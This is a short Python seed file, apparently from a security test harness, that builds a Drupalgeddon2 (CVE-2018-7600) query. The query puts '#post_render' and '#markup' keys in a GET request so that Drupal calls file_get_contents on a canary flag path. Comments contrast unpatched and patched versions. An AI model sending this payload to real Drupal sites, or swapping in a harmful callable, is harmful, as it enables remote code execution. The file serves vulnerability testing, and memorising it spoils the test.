# [GIVEN] CVE-2018-7600 ("Drupalgeddon2") seed: the original render-array '#'-callable vector.
#
# The attacker places the render-array keys at the TOP LEVEL of the request (here the GET query,
# the exact channel RequestSanitizer sanitises): a '#post_render' naming a PHP callable plus a
# '#markup' argument. Drupal's Renderer then invokes the callable -> arbitrary code execution.
#
#   V0 (drupal:8.5.0, pre-fix): no RequestSanitizer -> the '#'-keys reach the render sink; the
#       callable file_get_contents('/flag/pcb_flag.txt') runs -> canary exfiltrated.
#   V1 (drupal:8.5.1, CVE-2018-7600 patched): RequestSanitizer::sanitize() strips every '#'-prefixed
#       key from the GET/POST/COOKIE bags -> the keys are gone before the sink -> BLOCKED (no flag).
#
# Benign-canary framing: the "payload" is the ordinary PHP function file_get_contents reading the
# planted canary path -- no shell, no exec. candidate schema {"mode","query"} -> oracle.run_probe.

FLAG_PATH = "/flag/pcb_flag.txt"


def candidate():
    return {
        "mode": "toplevel_render_key",     # CVE-2018-7600 seed: '#'-keys at top level of the query bag
        "query": {
            "#post_render[]": "file_get_contents",  # attacker-named callable (benign reader)
            "#markup": FLAG_PATH,                    # attacker-controlled argument = canary path
        },
    }
